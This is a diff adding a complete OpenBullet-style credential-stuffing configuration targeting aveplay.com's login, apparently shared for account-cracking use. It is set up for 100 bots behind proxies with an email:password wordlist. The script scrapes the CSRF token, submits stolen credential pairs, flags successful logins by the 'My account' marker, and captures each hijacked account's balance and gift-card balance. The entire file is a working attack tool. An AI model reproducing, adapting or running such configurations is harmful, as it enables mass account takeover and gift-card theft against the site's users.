@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "aveplay",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-15T17:58:20.3041822+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUEST_TOKEN REQUEST GET "https://aveplay.com/auth/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "value=\"" " /></div>" Recursive=FALSE -> VAR "TOKENUNPARSED" "" "" 
+PARSE "<TOKENUNPARSED>" LR "" "" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#REQUEST_LOGIN_(POST) REQUEST POST "https://aveplay.com/auth/login" AutoRedirect=TRUE 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TOKEN>&user%5Blogin%5D=<USER>&user%5Bpassword%5D=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Referer: https://aveplay.com/auth/login" 
+  HEADER "Origin: https://aveplay.com" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email or password." 
+  KEYCHAIN Success OR 
+    KEY "My account" 
+#PARSE_balance PARSE "<SOURCE>" LR "<span class='color-red'>" "</span>" Recursive=FALSE -> CAP "AccountBalance" "" "" 
+#PARSE_GC PARSE "<SOURCE>" LR "<h3>Giftcards balance</h3>" "</p>" Recursive=FALSE -> CAP "GCBalance" "" "" 
